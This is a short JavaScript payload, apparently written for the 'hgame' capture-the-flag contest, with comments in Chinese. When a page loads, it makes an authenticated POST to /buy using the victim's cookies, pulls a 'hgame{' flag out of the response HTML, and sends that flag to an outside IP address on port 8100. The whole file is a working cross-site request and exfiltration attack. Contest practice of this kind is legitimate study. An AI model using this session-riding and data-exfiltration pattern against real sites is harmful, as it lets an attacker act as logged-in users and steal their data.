document.addEventListener('DOMContentLoaded', (event) => {
    fetch("/buy", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: "id=0",
        credentials: 'include' // 确保携带cookie等身份凭证
    })
    .then(response => response.text())
    .then(data => {
        // 这里的处理逻辑保持不变，继续解析data中的flag并发送到指定URL
        const parser = new DOMParser();
        const htmlDocument = parser.parseFromString(data, "text/html");
        const pElements = htmlDocument.getElementsByTagName("p");
        let flagContent = "";

        for (let p of pElements) {
            if (p.textContent.includes("hgame{")) {
                flagContent = p.textContent.split("hgame{")[1].split("}")[0];
                break;
            }
        }

        if (flagContent) {
            const targetUrl = `http://111.229.210.75:8100/${flagContent}`;
            fetch(targetUrl, { method: "GET" })
            .then(response => console.log("Flag sent successfully"))
            .catch(error => console.error("Error sending flag:", error));
        }
    })
    .catch(error => console.error("Error purchasing flag:", error));
});
